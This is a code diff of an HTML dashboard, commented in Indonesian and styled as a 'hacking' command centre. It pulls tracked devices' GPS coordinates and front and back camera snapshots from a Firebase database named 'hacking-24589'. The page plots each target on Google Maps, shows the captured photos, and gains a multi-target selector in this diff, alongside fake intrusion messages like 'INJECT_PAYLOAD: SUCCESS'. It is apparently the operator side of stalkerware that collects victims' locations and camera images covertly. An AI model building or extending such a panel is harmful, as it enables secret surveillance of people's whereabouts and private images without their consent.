@@ -3,189 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER_COMMAND // GOOGLE MAPS SATELLITE TRACKER</title>
+    <title>CYBER_COMMAND // TRACKING SYSTEM</title>
     <style>
         body {
-            background-color: #0b0f19;
+            background-color: #05070c;
             color: #00ff66;
             font-family: 'Courier New', Courier, monospace;
             margin: 0;
-            padding: 6px;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
+            padding: 8px;
             box-sizing: border-box;
+            font-size: 11px;
         }
-        .header-top {
+        .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px dashed #00ff66;
-            padding-bottom: 3px;
-            margin-bottom: 3px;
+            padding-bottom: 5px;
+            margin-bottom: 8px;
         }
-        h2 { 
-            font-size: 0.85rem; 
-            margin: 0; 
-        }
-        #clockDisplay {
-            font-size: 0.75rem;
+        .selector-box select {
+            background: #000;
             color: #00ff66;
-            font-weight: bold;
-        }
-        .container {
-            display: flex;
-            gap: 6px;
-            flex-grow: 1;
-            margin-bottom: 6px;
-            min-height: 0;
-        }
-        #map {
-            flex: 1.2;
             border: 1px solid #00ff66;
-            height: 100%;
+            padding: 3px;
+            font-family: 'Courier New', Courier, monospace;
         }
-        .right-grid {
-            flex: 1.4;
+        .main-layout {
+            display: grid;
+            grid-template-columns: 1.2fr 1fr;
+            gap: 8px;
+            align-items: stretch;
+        }
+        .left-panel {
+            display: flex;
+            flex-direction: column;
+        }
+        .right-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .box-container {
+            border: 1px solid #00ff66;
+            background: #0b0f19;
+            padding: 5px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Membuat kotak peta kiri memenuhi ruang ke bawah secara otomatis */
+        .box-container.full-height {
+            flex-grow: 1;
+        }
+        .box-title {
+            font-size: 10px;
+            color: #aaa;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+        }
+        /* Peta utama mengisi penuh sisa tinggi kontainer */
+        #mainMap {
+            width: 100%;
+            flex-grow: 1;
+            min-height: 380px;
+            border: none;
+            background: #000;
+        }
+        iframe {
+            width: 100%;
+            border: none;
+            background: #000;
+        }
+        .camera-container {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            grid-template-rows: 120px 1fr;
             gap: 6px;
-            height: 100%;
-            box-sizing: border-box;
         }
-        .panel-box {
-            background-color: #05070c;
-            border: 1px solid #00ff66;
-            padding: 4px;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-        .panel-title {
-            font-size: 0.55rem;
-            color: #00ff66;
-            text-align: center;
-            border-bottom: 1px dashed #00ff66;
-            padding-bottom: 2px;
-            margin-bottom: 3px;
-        }
-        #satelliteFrame {
+        .cam-box img {
             width: 100%;
-            flex-grow: 1;
-            border: 1px dashed #00ff66;
-        }
-        .code-box {
-            background-color: #020408;
-            border: 1px dashed #00ff66;
-            flex-grow: 1;
-            padding: 4px;
-            font-size: 0.55rem;
-            color: #00ff66;
-            overflow-y: hidden;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-        }
-        #codeStream {
-            margin: 0;
-            padding: 0;
-            list-style: none;
-            opacity: 0.9;
-        }
-        .cam-wrapper {
-            grid-column: span 2;
-            display: flex;
-            flex-direction: column;
-        }
-        .cam-col {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            text-align: center;
-        }
-        .cam-preview {
-            width: 100%;
-            height: 100%;
-            min-height: 90px;
-            border: 1px solid #00ff66;
+            height: 110px;
             object-fit: cover;
-            background-color: #000;
-        }
-        #logBox {
-            background-color: #05070c;
             border: 1px solid #00ff66;
-            height: 50px;
-            padding: 4px;
-            font-size: 0.6rem;
-            overflow-y: auto;
-            margin-bottom: 2px;
+            background: #000;
         }
-        .status-bar {
-            font-size: 0.65rem;
-            margin-bottom: 3px;
-            display: flex;
-            justify-content: space-between;
+        .matrix-box {
+            height: 85px;
+            overflow-y: auto;
+            background: #020408;
+            border: 1px solid #00ff66;
+            padding: 4px;
+            font-size: 10px;
+            color: #00ff66;
+        }
+        .terminal-container {
+            border: 1px solid #00ff66;
+            background: #020408;
+            padding: 5px;
+            margin-top: 8px;
+            height: 60px;
+            overflow-y: auto;
+            font-size: 10px;
+        }
+        .btn-maps {
+            display: inline-block;
+            background: #00ff66;
+            color: #000;
+            text-decoration: none;
+            padding: 3px 6px;
+            font-weight: bold;
+            font-size: 10px;
+            margin-bottom: 5px;
         }
     </style>
 </head>
 <body>
 
-    <div class="header-top">
-        <h2>[ COMMAND_CENTER : TRACKING SYSTEM ]</h2>
-        <div id="clockDisplay">00:00:00 - 00/00/0000</div>
+    <!-- Header Status -->
+    <div class="header">
+        <div>[ COMMAND_CENTER : TRACKING SYSTEM ] &nbsp; <span style="color:#00ff66;">STATUS: TARGET_LOCKED [LIVE]</span></div>
+        <div class="selector-box">
+            Target: 
+            <select id="targetSelect" onchange="switchTarget()">
+                <option value="">-- Pilih Perangkat --</option>
+            </select>
+        </div>
+        <div id="clockDisplay">00:00:00 - 0/0/0000</div>
     </div>
 
-    <div class="status-bar">
-        <span>STATUS: <span id="statusSpan" style="color: #ff3333;">WAITING_FOR_TARGET...</span></span>
-        <span id="targetMeta" style="color: #888;">Target: None</span>
-    </div>
+    <!-- Main Layout -->
+    <div class="main-layout">
+        
+        <!-- Kolom Kiri: Peta Utama (Memenuhi ke bawah) -->
+        <div class="left-panel">
+            <div class="box-container full-height">
+                <a id="gmapsLink" href="#" target="_blank" class="btn-maps">Buka di Maps ↗</a>
+                <iframe id="mainMap" src="about:blank"></iframe>
+            </div>
+        </div>
 
-    <div class="container">
-        <!-- 1. SISI KIRI: GPS Utama -->
-        <iframe id="map" src="" frameborder="0"></iframe>
-
-        <!-- SISI KANAN: Grid 1x1 Seimbang -->
-        <div class="right-grid">
-            
-            <!-- Kolom Kiri-Atas: Peta Satelit Mini -->
-            <div class="panel-box">
-                <div class="panel-title">SATELLITE_FEED</div>
-                <iframe id="satelliteFrame" src="" frameborder="0"></iframe>
-                <div id="coordText" style="font-size: 0.5rem; text-align: center; margin-top: 2px; color: #888;">Lat: -, Lon: -</div>
+        <!-- Kolom Kanan: Peta Satelit Mini & Matrix Stream -->
+        <div class="right-panel">
+            <div class="box-container">
+                <div class="box-title">SATELLITE_FEED</div>
+                <iframe id="satMap" src="about:blank" style="height: 110px;"></iframe>
             </div>
 
-            <!-- Kolom Kanan-Atas: Matrix Stream -->
-            <div class="panel-box">
-                <div class="panel-title">MATRIX_STREAM</div>
-                <div class="code-box">
-                    <ul id="codeStream">
-                        <li>> INITIALIZING SECURE SOCKET...</li>
-                    </ul>
+            <div class="box-container">
+                <div class="box-title">LIVE_CAMERA_FEED (FRONT & BACK)</div>
+                <div class="camera-container">
+                    <div class="cam-box">
+                        <img id="imgFront" src="https://via.placeholder.com/320x240?text=No+Signal" alt="Kamera Depan">
+                        <div style="text-align:center; font-size:9px; margin-top:2px;">Kamera Depan</div>
+                    </div>
+                    <div class="cam-box">
+                        <img id="imgBack" src="https://via.placeholder.com/320x240?text=No+Signal" alt="Kamera Belakang">
+                        <div style="text-align:center; font-size:9px; margin-top:2px;">Kamera Belakang</div>
+                    </div>
                 </div>
             </div>
 
-            <!-- Baris Bawah: Live Camera Depan & Belakang -->
-            <div class="panel-box cam-wrapper">
-                <div class="panel-title" style="margin-bottom: 4px;">LIVE_CAMERA_FEED (FRONT & BACK)</div>
-                <div style="display: flex; gap: 6px; flex-grow: 1; min-height: 0;">
-                    <div class="cam-col">
-                        <span style="font-size: 0.55rem; color: #00ff66; margin-bottom: 2px;">Kamera Depan</span>
-                        <img id="camFront" class="cam-preview" src="" alt="Waiting...">
-                    </div>
-                    <div class="cam-col">
-                        <span style="font-size: 0.55rem; color: #00ff66; margin-bottom: 2px;">Kamera Belakang</span>
-                        <img id="camBack" class="cam-preview" src="" alt="Waiting...">
-                    </div>
+            <div class="box-container">
+                <div class="box-title">MATRIX_STREAM</div>
+                <div class="matrix-box" id="matrixStream">
+                    > [10.00.00] SYS_ALLOC: 0x1F8F5F8F8<br>
+                    > [10.00.00] CONNECT: TCP_INTRUSION<br>
+                    > [10.00.01] BYPASS.AUTH: OK<br>
                 </div>
             </div>
 
         </div>
     </div>
 
-    <!-- Terminal Log -->
-    <div id="logBox">
-        [+] Waiting for target transmission...
+    <!-- Terminal Log di Bawah -->
+    <div class="terminal-container" id="terminalLog">
+        > [SYSTEM] Initializing multi-target monitor interface...<br>
     </div>
 
     <!-- Firebase SDK -->
@@ -193,16 +185,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        // Real-time Clock & Date Display
-        function updateClock() {
-            const now = new Date();
-            const timeStr = now.toTimeString().split(' ')[0];
-            const dateStr = now.toLocaleDateString('id-ID');
-            document.getElementById("clockDisplay").innerText = `${timeStr} - ${dateStr}`;
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
-
         const firebaseConfig = {
             databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
         };
@@ -212,92 +194,109 @@
         }
         const db = firebase.database();
 
-        const logBox = document.getElementById("logBox");
-        const statusSpan = document.getElementById("statusSpan");
-        const targetMeta = document.getElementById("targetMeta");
-        const mapFrame = document.getElementById("map");
-        const satelliteFrame = document.getElementById("satelliteFrame");
-        const coordText = document.getElementById("coordText");
-        const camFront = document.getElementById("camFront");
-        const camBack = document.getElementById("camBack");
-        const codeStream = document.getElementById("codeStream");
+        let allTargetsData = {};
+        let selectedTargetId = localStorage.getItem("selected_target_id") || "";
+        let targetImages = {};
 
-        let initialized = false;
+        const targetSelect = document.getElementById('targetSelect');
+        const mainMap = document.getElementById('mainMap');
+        const satMap = document.getElementById('satMap');
+        const gmapsLink = document.getElementById('gmapsLink');
+        const imgFront = document.getElementById('imgFront');
+        const imgBack = document.getElementById('imgBack');
+        const terminalLog = document.getElementById('terminalLog');
+        const matrixStream = document.getElementById('matrixStream');
 
-        // Matrix Stream Generator
-        const dummyHex = [
-            "SYS_ALLOC: 0x7FFF5FBFF8", "BYPASS_AUTH: OK", "STREAM_PACKET #8821",
-            "DECRYPTING_KEY_RSA...", "GPS_VECTOR: LOCKED", "PORT_FWD: 443 ACTIVE",
-            "INJECT_PAYLOAD: SUCCESS", "MEM_DUMP: 0x0045A1", "HANDSHAKE_SECURE",
-            "CONNECT: TCP_INTRUSION", "BYPASS_FIREWALL: SUCCESS", "ROOT_ACCESS: GRANTED"
-        ];
-
-        for(let i=0; i<6; i++) {
-            const rnd = dummyHex[Math.floor(Math.random() * dummyHex.length)];
-            codeStream.innerHTML += `<li>> ${rnd}</li>`;
+        function logTerminal(text) {
+            terminalLog.innerHTML += `> ${text}<br>`;
+            terminalLog.scrollTop = terminalLog.scrollHeight;
         }
 
+        // Jam Real-time
         setInterval(() => {
-            const randomHex = dummyHex[Math.floor(Math.random() * dummyHex.length)];
-            const timeStr = new Date().toLocaleTimeString();
-            codeStream.innerHTML += `<li>> [${timeStr}] ${randomHex}</li>`;
-            if (codeStream.children.length > 9) {
-                codeStream.removeChild(codeStream.children[0]);
-            }
-        }, 400);
+            const now = new Date();
+            const timeStr = now.toTimeString().split(' ')[0];
+            const dateStr = now.toLocaleDateString();
+            document.getElementById('clockDisplay').innerText = `${timeStr} - ${dateStr}`;
+        }, 1000);
 
-        // 1. Memantau Lokasi GPS & Timestamp Target secara Real-time
+        // 1. Ambil Log Kamera Masuk & Petakan berdasarkan Target ID
+        db.ref("camera_logs").limitToLast(30).on("child_added", (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.targetId) {
+                if (!targetImages[data.targetId]) {
+                    targetImages[data.targetId] = { Depan: null, Belakang: null };
+                }
+                targetImages[data.targetId][data.cameraType] = data.image;
+
+                matrixStream.innerHTML += `> [${new Date().toTimeString().split(' ')[0]}] INJECT_PAYLOAD: SUCCESS [${data.cameraType}]<br>`;
+                matrixStream.scrollTop = matrixStream.scrollHeight;
+
+                if (data.targetId === selectedTargetId) {
+                    updateCameraUI(selectedTargetId);
+                }
+            }
+        });
+
+        // 2. Pantau Perubahan Data GPS Semua Target
         db.ref("targets").on("value", (snapshot) => {
             const targets = snapshot.val();
-            if (targets) {
-                statusSpan.style.color = "#00ff66";
-                statusSpan.innerText = "TARGET_LOCKED [LIVE]";
-                logBox.innerHTML = "";
-
-                let lastLat, lastLon, deviceName = "Unknown", lastTime = "";
-
-                Object.keys(targets).forEach((id) => {
-                    const data = targets[id];
-                    deviceName = data.device || "Mobile Target";
-                    lastLat = data.latitude;
-                    lastLon = data.longitude;
-                    
-                    if(data.timestamp) {
-                        const dateObj = new Date(data.timestamp);
-                        lastTime = dateObj.toLocaleTimeString() + " " + dateObj.toLocaleDateString('id-ID');
-                    }
-
-                    targetMeta.innerText = `Device: ${deviceName}`;
-                    logBox.innerHTML += `> [${lastTime}] ${deviceName} -> [Lat: ${lastLat.toFixed(4)}, Lon: ${lastLon.toFixed(4)}]<br>`;
-                });
-
-                if (lastLat && lastLon) {
-                    if (!initialized) {
-                        mapFrame.src = `https://maps.google.com/maps?q=${lastLat},${lastLon}&z=16&output=embed`;
-                        satelliteFrame.src = `https://maps.google.com/maps?q=${lastLat},${lastLon}&z=19&t=k&output=embed`;
-                        initialized = true;
-                    }
-                    coordText.innerText = `${lastLat.toFixed(4)}, ${lastLon.toFixed(4)}`;
-                }
-                logBox.scrollTop = logBox.scrollHeight;
+            if (!targets) {
+                targetSelect.innerHTML = '<option value="">-- Tidak ada perangkat --</option>';
+                return;
             }
+
+            allTargetsData = targets;
+            const targetIds = Object.keys(targets);
+
+            let optionsHTML = '<option value="">-- Pilih Perangkat --</option>';
+            targetIds.forEach(id => {
+                const tName = targets[id].device || id;
+                const isSelected = (id === selectedTargetId) ? 'selected' : '';
+                optionsHTML += `<option value="${id}" ${isSelected}>${tName} (${id})</option>`;
+            });
+            targetSelect.innerHTML = optionsHTML;
+
+            if (!selectedTargetId || !targets[selectedTargetId]) {
+                selectedTargetId = targetIds[0];
+                targetSelect.value = selectedTargetId;
+                localStorage.setItem("selected_target_id", selectedTargetId);
+            }
+
+            renderSelectedTargetData();
         });
 
-        // 2. Memantau Foto Kamera Berkala dengan Info Waktu Masuk
-        db.ref("camera_logs").limitToLast(5).on("child_added", (snapshot) => {
-            const camData = snapshot.val();
-            if (camData) {
-                const timeLog = camData.timestamp ? new Date(camData.timestamp).toLocaleTimeString() : "";
-                if (camData.cameraType === "Depan") {
-                    camFront.src = camData.image;
-                    logBox.innerHTML += `> [${timeLog}] Camera Front Snapshot Captured.<br>`;
-                } else if (camData.cameraType === "Belakang") {
-                    camBack.src = camData.image;
-                    logBox.innerHTML += `> [${timeLog}] Camera Back Snapshot Captured.<br>`;
-                }
-                logBox.scrollTop = logBox.scrollHeight;
+        function switchTarget() {
+            selectedTargetId = targetSelect.value;
+            localStorage.setItem("selected_target_id", selectedTargetId);
+            renderSelectedTargetData();
+            logTerminal(`[SYSTEM] Switched view to target: ${selectedTargetId}`);
+        }
+
+        function renderSelectedTargetData() {
+            if (!selectedTargetId || !allTargetsData[selectedTargetId]) return;
+
+            const data = allTargetsData[selectedTargetId];
+            const lat = data.latitude;
+            const lon = data.longitude;
+
+            mainMap.src = `https://maps.google.com/maps?q=${lat},${lon}&z=16&output=embed`;
+            satMap.src = `https://maps.google.com/maps?q=${lat},${lon}&z=18&t=k&output=embed`;
+            gmapsLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            updateCameraUI(selectedTargetId);
+        }
+
+        function updateCameraUI(tId) {
+            const imgs = targetImages[tId];
+            if (imgs) {
+                if (imgs.Depan) imgFront.src = imgs.Depan;
+                if (imgs.Belakang) imgBack.src = imgs.Belakang;
+            } else {
+                imgFront.src = "https://via.placeholder.com/320x240?text=Waiting+Feed...";
+                imgBack.src = "https://via.placeholder.com/320x240?text=Waiting+Feed...";
             }
-        });
+        }
     </script>
 </body>
 </html>
